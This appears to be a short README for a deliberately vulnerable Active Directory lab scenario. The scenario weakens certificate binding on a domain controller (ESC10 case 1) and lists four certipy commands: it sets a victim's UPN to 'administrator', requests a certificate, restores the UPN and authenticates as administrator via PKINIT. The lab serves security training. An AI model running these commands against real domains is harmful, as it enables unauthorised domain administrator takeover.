# esc10-case1

KDC weak certificate binding (StrongCertificateBindingEnforcement 0, ESC10 case 1). Sets `dc.strong_cert_binding` to `0` on a domain controller (default: the root DC).

Attack:

With GenericWrite on a user, set its UPN to a privileged account, request a certificate, restore the UPN, then authenticate with PKINIT:

    certipy account update -u <attacker> -p ... -user <victim> -upn administrator
    certipy req -u <victim> -p ... -ca <NB>-CA -template User
    certipy account update -u <attacker> -p ... -user <victim> -upn <victim>
    certipy auth -pfx administrator.pfx -domain <domain>

The `esc9` scenario depends on this one (on the DC of the CA's domain).

How to verify:

    reg query HKLM\SYSTEM\CurrentControlSet\Services\Kdc /v StrongCertificateBindingEnforcement   # 0x0 when enabled

Disable restores the value declared for the host in the lab's `base_settings`.
